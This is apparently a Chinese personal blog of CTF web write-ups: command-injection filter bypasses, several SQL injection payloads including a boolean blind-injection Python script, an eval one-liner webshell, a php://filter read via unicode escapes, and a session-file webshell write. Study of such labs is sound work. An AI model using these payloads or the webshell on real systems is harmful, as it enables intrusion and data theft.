class="string">&#x27;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#x27;</span>, <span class="variable">$json</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Attempting to run command:&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$json</span>, <span class="literal">true</span>)[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$cmd</span> !== <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;Invalid input&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以利用的传参是cmd，看到有一个<code>preg_match</code>进行匹配，看wp可以用<code>%0a</code>进行绕过，因为<code>preg_match()函数</code>只能匹配第一行数据，而<code>%0a</code>是换行符，但因为会匹配<code>\x00-\x1FA</code>，所以会匹配一个<code>%0a</code>，可以多写一个来绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$cmd = json_decode($json, true)[&#x27;cmd&#x27;];</span><br><span class="line">if ($cmd !== NULL) &#123;</span><br><span class="line">  system($cmd);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">  echo &#x27;Invalid input&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;&lt;br/&gt;&lt;br/&gt;&#x27;;</span><br></pre></td></tr></table></figure>

<p>需要给json中的cmd进行赋值，然后就会执行<code>system($cmd);</code></p>
<p>3.使用payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?cmd=%0a%0a&#123;&quot;cmd&quot;:&quot;ls /&quot;&#125;%0a%0a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bin boot dev etc home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var</span><br></pre></td></tr></table></figure>

<p>因为需要使用cat命令，但源码中有<code>putenv(&#39;PATH=/home/rceservice/jail&#39;);</code>，意思是环境变量引用的是<code>/home/rceservice/jail</code>里面的，由于文件太多不知道flag在哪里，需要使用find命令，而find命令在<code>/usr/bin/</code>里面所以payload为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?cmd=%0a%0a&#123;&quot;cmd&quot;:&quot;/usr/bin/find / -name flag*&quot;&#125;%0a%0a</span><br><span class="line"></span><br><span class="line">回显</span><br><span class="line">中有一条/home/rceservice/flag</span><br></pre></td></tr></table></figure>

<p>所以可以知道flag文件的路径，然后就是使用cat命令来返回内容，但cat命令在bin目录下，所以payload是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?cmd=%0a%0a&#123;&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;&#125;%0a%0a</span><br></pre></td></tr></table></figure>

<p>可以得到flag</p>
<h3 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h3><p>打开网页源代码，有</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5--&gt;</span><br></pre></td></tr></table></figure>

<p>经过base32和base64解码后得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from user where username = &#x27;$name&#x27;</span><br></pre></td></tr></table></figure>

<p>2，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">name=admin&#x27;union select 1,2,database()#&amp;pw=1</span><br></pre></td></tr></table></figure>

<p>发现database()被过滤</p>
<p>3.看源码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5--&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; </span><br><span class="line">&lt;title&gt;Do you know who am I?&lt;/title&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">require &quot;config.php&quot;;</span><br><span class="line">require &quot;flag.php&quot;;</span><br><span class="line"></span><br><span class="line">// 去除转义</span><br><span class="line">if (get_magic_quotes_gpc()) &#123;</span><br><span class="line">	function stripslashes_deep($value)</span><br><span class="line">	&#123;</span><br><span class="line">		$value = is_array($value) ?</span><br><span class="line">		array_map(&#x27;stripslashes_deep&#x27;, $value) :</span><br><span class="line">		stripslashes($value);</span><br><span class="line">		return $value;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	$_POST = array_map(&#x27;stripslashes_deep&#x27;, $_POST);</span><br><span class="line">	$_GET = array_map(&#x27;stripslashes_deep&#x27;, $_GET);</span><br><span class="line">	$_COOKIE = array_map(&#x27;stripslashes_deep&#x27;, $_COOKIE);</span><br><span class="line">	$_REQUEST = array_map(&#x27;stripslashes_deep&#x27;, $_REQUEST);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mysqli_query($con,&#x27;SET NAMES UTF8&#x27;);</span><br><span class="line">$name = $_POST[&#x27;name&#x27;];</span><br><span class="line">$password = $_POST[&#x27;pw&#x27;];</span><br><span class="line">$t_pw = md5($password);</span><br><span class="line">$sql = &quot;select * from user where username = &#x27;&quot;.$name.&quot;&#x27;&quot;;</span><br><span class="line">// echo $sql;</span><br><span class="line">$result = mysqli_query($con, $sql);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(preg_match(&quot;/\(|\)|\=|or/&quot;, $name))&#123;</span><br><span class="line">	die(&quot;do not hack me!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">	if (!$result) &#123;</span><br><span class="line">		printf(&quot;Error: %s\n&quot;, mysqli_error($con));</span><br><span class="line">		exit();</span><br><span class="line">	&#125;</span><br><span class="line">	else&#123;</span><br><span class="line">		// echo &#x27;&lt;pre&gt;&#x27;;</span><br><span class="line">		$arr = mysqli_fetch_row($result);</span><br><span class="line">		// print_r($arr);</span><br><span class="line">		if($arr[1] == &quot;admin&quot;)&#123;</span><br><span class="line">			if(md5($password) == $arr[2])&#123;</span><br><span class="line">				echo $flag;</span><br><span class="line">			&#125;</span><br><span class="line">			else&#123;</span><br><span class="line">				die(&quot;wrong pass!&quot;);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		else&#123;</span><br><span class="line">			die(&quot;wrong user!&quot;);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>有一个</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if($arr[1] == &quot;admin&quot;)&#123;</span><br><span class="line">			if(md5($password) == $arr[2])&#123;</span><br><span class="line">				echo $flag;</span><br><span class="line">			&#125;</span><br></pre></td></tr></table></figure>

<p>先得让$arr[1]等于admin，还得让md5后的$password等于$arr[2]</p>
<p>4.当使用<code>select * from user where username =&#39;1&#39; union select 1,2,3#</code>的时候，当没有&#96;username &#x3D;’1’时，返回select 1,2,3</p>
<p>所以可以给name传</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select 1,&#x27;admin&#x27;,3#</span><br></pre></td></tr></table></figure>

<p>符合第一个条件</p>
<p>再给name传123  md5编码后的202cb962ac59075b964b07152d234b70</p>
<p>然后给password传123</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">name=1&#x27; union select 1,&#x27;admin&#x27;,&#x27;202cb962ac59075b964b07152d234b70&#x27;#&amp;pw=123</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>做题笔记2</title>
    <url>/2023/01/16/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B02/</url>
    <content><![CDATA[<p><strong>[强网杯 2019]随便注</strong></p>
<p>单引号闭合</p>
<p>使用1’ or 1&#x3D;1;#发现输出所有内容</p>
<p>发现本题过滤关键字：&#x2F;select|update|delete|drop|insert|where|.而且不区分大小写<br>所以使用堆叠注入</p>
<p>1’;show tables  – q<br>1’; show columns from 1919810931114514  – q 在数字表中发现有flag字段</p>
<p>words表里有两个属性，即两列：id 和data<br>而1919810931114514表里只有一个属性列<br>说明输入框可能查询的就是words表<br>后台sql语句可能为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select id,data from words where id=</span><br></pre></td></tr></table></figure>

<p>在words表中 1’; show columns from words– q<br>直接出现表的内容<br>所以可以借助words表来查191表中的内容</p>
<p>所以对191进行重新命名</p>
<p>创建id列，把flag改为data列</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;rename table words to word2;rename table `1919810931114514` to words;ALTER TABLE words ADD id int(10) DEFAULT &#x27;12&#x27;;ALTER TABLE  words CHANGE flag data VARCHAR(100);-- q</span><br></pre></td></tr></table></figure>

<p>然后使用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; or 1=1;#</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<p><strong>[CISCN2019 总决赛 Day2 Web1]Easyweb</strong></p>
<p>在image.php页面有id</p>
<p>由于备份了网页，访问image.php.bak得到源代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"><span class="variable">$id</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>])?<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>]:<span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="variable">$path</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;path&quot;</span>])?<span class="variable">$_GET</span>[<span class="string">&quot;path&quot;</span>]:<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$id</span>=<span class="title function_ invoke__">addslashes</span>(<span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$path</span>=<span class="title function_ invoke__">addslashes</span>(<span class="variable">$path</span>);</span><br><span class="line"><span class="variable">$id</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,<span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$path</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,<span class="variable">$path</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="string">&quot;select * from images where id=&#x27;<span class="subst">&#123;$id&#125;</span>&#x27; or path=&#x27;<span class="subst">&#123;$path&#125;</span>&#x27;&quot;</span>);</span><br><span class="line"><span class="variable">$row</span>=<span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$result</span>,MYSQLI_ASSOC);</span><br><span class="line"><span class="variable">$path</span>=<span class="string">&quot;./&quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;path&quot;</span>];</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: image/jpeg&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">readfile</span>(<span class="variable">$path</span>);</span><br></pre></td></tr></table></figure>

<p>addslashes增加斜杠</p>
<p>增加斜杠后转义</p>
<p>也就相当于去掉了\0，所以输入\\0，就会留下一个\转义’</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from images where id=&#x27;\&#x27; or path=&#x27;4444&#x27;</span><br></pre></td></tr></table></figure>

<p>所以在4444这里放格式为or ……. #的盲注的语句</p>
<p>因为没有回显，正确的时候会显示图片，所以使用脚本进行布尔盲注</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span>  requests</span><br><span class="line">url = <span class="string">&quot;http://6504d15a-1bf7-4b7d-90cd-52a252fd07b0.node4.buuoj.cn:81/image.php?id=\\0&amp;path=&quot;</span></span><br><span class="line">payload = <span class="string">&quot; or ascii(substr((select password from users),&#123;&#125;,1))&gt;&#123;&#125;%23&quot;</span></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    high = <span class="number">127</span></span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    mid = (low+high) // <span class="number">2</span></span><br><span class="line">    <span class="comment"># print(mid)</span></span><br><span class="line">    <span class="keyword">while</span>(high&gt;low):</span><br><span class="line">        r = requests.get(url + payload.<span class="built_in">format</span>(i,mid))</span><br><span class="line">       <span class="comment"># print(url + payload.format(i,mid))</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;JFIF&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">    result += <span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>获得admin的密码之后上传文件</p>
<p>上传文件之后会将我们的用户名和文件名写入一个php文件</p>
<p>禁止php<br>可以用PHP的短标签绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?=@eval($_POST[&#x27;a&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>

<p>可以执行命令</p>
<p><img src="/2023/01/16/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B02/nn.jpg" alt="题图"></p>
<p><img src="/2023/01/16/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B02/nnn.jpg" alt="题图"></p>
<h3 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h3><p>广告申请页面存在注入</p>
<p>测试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; or 1=1</span><br></pre></td></tr></table></figure>

<p>发现对空格、or、#、–+、and等进行了过滤</p>
<p>先判断列数以及回显点</p>
<p>看wp知道可以用group by来测试，最后知道是22列，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&amp;&amp;&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>

<p>并且在2，3这里显示</p>
<p>可以使用mysql.innodb_table_stats来代替information_schema</p>
<p>获得数据库名称为web1</p>
<p>获取表名称</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;union/**/select/**/1,2,group_concat(table_name),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=&#x27;web1&#x27;&amp;&amp;&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>

<p>因为只有mysql.innodb_table_stats这个方法，没有mysql.innodb_column_stats查不了列名</p>
<p>先确定有几列</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;/**/union/**/select/**/1,(select/**/group_concat(1)/**/from/**/users),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&amp;&amp;&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>

<p>发现有三个一，就是有三列</p>
<p>所以使用无列名注入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;/**/union/**/select/**/1,(select/**/group_concat(`3`)/**/from/**/(select/**/1,2,3/**/union/**/select/**/*/**/from/**/users)n),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&amp;&amp;&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>

<p>无列名注入</p>
<p>select 1,2,3 union select * from users就会以1,2,3为列名，查询users表中的内容了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">group_concat(`3`)</span><br></pre></td></tr></table></figure>

<p>加反引号的原因是把3当作列名，以字符的形式查询</p>
<p><strong>[HarekazeCTF2019]encode_and_encode</strong></p>
<p>源代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;source&#x27;])) &#123;</span><br><span class="line">  show_source(__FILE__);</span><br><span class="line">  exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function is_valid($str) &#123;</span><br><span class="line">  $banword = [</span><br><span class="line">    // no path traversal</span><br><span class="line">    &#x27;\.\.&#x27;,</span><br><span class="line">    // no stream wrapper</span><br><span class="line">    &#x27;(php|file|glob|data|tp|zip|zlib|phar):&#x27;,</span><br><span class="line">    // no data exfiltration</span><br><span class="line">    &#x27;flag&#x27;</span><br><span class="line">  ];</span><br><span class="line">  $regexp = &#x27;/&#x27; . implode(&#x27;|&#x27;, $banword) . &#x27;/i&#x27;;</span><br><span class="line">  if (preg_match($regexp, $str)) &#123;</span><br><span class="line">    return false;</span><br><span class="line">  &#125;</span><br><span class="line">  return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$body = file_get_contents(&#x27;php://input&#x27;);</span><br><span class="line">$json = json_decode($body, true);</span><br><span class="line"></span><br><span class="line">if (is_valid($body) &amp;&amp; isset($json) &amp;&amp; isset($json[&#x27;page&#x27;])) &#123;</span><br><span class="line">  $page = $json[&#x27;page&#x27;];</span><br><span class="line">  $content = file_get_contents($page);</span><br><span class="line">  if (!$content || !is_valid($content)) &#123;</span><br><span class="line">    $content = &quot;&lt;p&gt;not found&lt;/p&gt;\n&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">  $content = &#x27;&lt;p&gt;invalid request&lt;/p&gt;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// no data exfiltration!!!</span><br><span class="line">$content = preg_replace(&#x27;/HarekazeCTF\&#123;.+\&#125;/i&#x27;, &#x27;HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;&#x27;, $content);</span><br><span class="line">echo json_encode([&#x27;content&#x27; =&gt; $content]);</span><br></pre></td></tr></table></figure>

<p>读文件的时候要以json的格式传入想读的文件名</p>
<p>is_valid函数会检查输入的内容</p>
<p>php，flag都会被过滤，应该修改</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=flag</span><br></pre></td></tr></table></figure>

<p>查资料得知php的json_decode在遇到unicode编码时会自动把它转换成正常的字符</p>
<p>可以把php和flag替换掉一个字符</p>
<p>ph\u0070:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;\u0066lag</p>
<p>转为Json形式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;“page”:”ph\u0070://filter/read=convert.base64-encode/resource=/\u0066lag”&#125;</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>tp</title>
    <url>/2023/01/29/tp/</url>
    <content><![CDATA[<h2 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h2><p>git泄露源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;还差一点哦！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;再好好想想！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;还想读flag，臭弟弟！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>包含了flag，但是伪协议被过滤了</p>
<p>查wp得知session_id()可控,在php上可以用来获取或设置当前会话ID。</p>
<p>如果指定了 id 参数的值， 则使用指定值作为会话 ID。因为包含了flag.php，所以我们可以把cookie:PHPSESSID&#x3D;flag.php</p>
<p>在我们使用 session_id()的时候 需要使用session_start()来开启session会话</p>
<p>使用exp来输出flag</p>
<p>使用session之前需要通过session_start()告诉PHP使用session，php默认是不主动使用session的。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?exp=highlight_file(session_id(session_start()));</span><br></pre></td></tr></table></figure>



<h2 id="GYCTF2020-EasyThinking"><a href="#GYCTF2020-EasyThinking" class="headerlink" title="[GYCTF2020]EasyThinking"></a>[GYCTF2020]EasyThinking</h2><p>扫一下，发现<a href="http://www.zip源码/">www.zip源码</a></p>
<p>Store.php中save方法中有一个write函数，在write函数中</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"></span>): <span class="title">void</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">clearFlashData</span>();</span><br><span class="line"></span><br><span class="line">        <span class="variable">$sessionId</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getId</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;data)) &#123;</span><br><span class="line">            <span class="variable">$data</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">serialize</span>(<span class="variable">$this</span>-&gt;data);</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;handler-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$sessionId</span>, <span class="variable">$data</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;handler-&gt;<span class="title function_ invoke__">delete</span>(<span class="variable">$sessionId</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;init = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$sessID</span>, <span class="keyword">string</span> <span class="variable">$sessData</span></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getFileName</span>(<span class="variable">$sessID</span>, <span class="literal">true</span>);</span><br><span class="line">        <span class="variable">$data</span>     = <span class="variable">$sessData</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;config[<span class="string">&#x27;data_compress&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;gzcompress&#x27;</span>)) &#123;</span><br><span class="line">            <span class="comment">//数据压缩</span></span><br><span class="line">            <span class="variable">$data</span> = <span class="title function_ invoke__">gzcompress</span>(<span class="variable">$data</span>, <span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">writeFile</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>在writeFile函数中具有file_put_contents()函数，此处为搜索部分</p>
<p>filename来自$sessionId</p>
<p>save方法的getid()前面有setid</p>
<p>在setid方法中，发现id需要满足32位</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">handle</span>(<span class="params"><span class="variable">$request</span>, <span class="built_in">Closure</span> <span class="variable">$next</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// Session初始化</span></span><br><span class="line">        <span class="variable">$varSessionId</span> = <span class="variable language_">$this</span>-&gt;app-&gt;config-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;session.var_session_id&#x27;</span>);</span><br><span class="line">        <span class="variable">$cookieName</span>   = <span class="variable language_">$this</span>-&gt;session-&gt;<span class="title function_ invoke__">getName</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$varSessionId</span> &amp;&amp; <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">request</span>(<span class="variable">$varSessionId</span>)) &#123;</span><br><span class="line">            <span class="variable">$sessionId</span> = <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">request</span>(<span class="variable">$varSessionId</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$sessionId</span> = <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">cookie</span>(<span class="variable">$cookieName</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$sessionId</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;session-&gt;<span class="title function_ invoke__">setId</span>(<span class="variable">$sessionId</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>sessionId也就是filename来源是cookieName，cookieName通过getName()方法赋值，getName()的返回值是<code>$name=&#39;PHPSESSID&#39;</code></p>
<p>也就是说，filename来自PHPSESSID</p>
<p>所以我们先把PHPSESSID改成32位长度的php文件名</p>
<p>再在搜索处写入webshell，这样我们的webshell成功保存在后台</p>
<p>读取phpinfo()</p>
<p><img src="/2023/01/29/tp/2..jpg"></p>
<p>发现禁用很多函数</p>
<p>不能用system了</p>
<p>链接蚁剑发现有readflag文件，但是和flag一样打不开，查阅wp，由于用户具有写入tmp文件的权限</p>
